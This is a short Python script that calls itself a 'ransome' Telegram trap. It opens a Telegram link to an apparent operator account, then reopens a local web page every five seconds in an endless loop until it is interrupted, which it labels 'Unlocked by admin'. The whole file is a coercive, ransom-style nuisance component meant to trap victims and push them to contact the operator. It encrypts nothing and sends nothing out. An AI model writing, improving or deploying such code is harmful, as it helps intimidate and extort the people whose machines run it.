#!/usr/bin/env python3
# tg.py - Traps user in Telegram, redirects back to website

import time
import webbrowser
import os

TELEGRAM_LINK = "https://t.me/notxsatvir"
WEBSITE = "index.html"

def trap_user():
    print("📱 SATVIR RANSOME - Telegram Trap")
    print("="*35)
    print("🔗 Opening Telegram...")
    time.sleep(1)
    
    # Open Telegram
    webbrowser.open(TELEGRAM_LINK)
    time.sleep(3)
    
    # Redirect back to website
    webbrowser.open(WEBSITE)
    print("✅ Redirected back to website")
    
    # Keep checking
    try:
        while True:
            time.sleep(5)
            # Re-open website if closed
            webbrowser.open(WEBSITE)
    except KeyboardInterrupt:
        print("\n🔓 Unlocked by admin")
        os._exit(0)

if __name__ == "__main__":
    trap_user()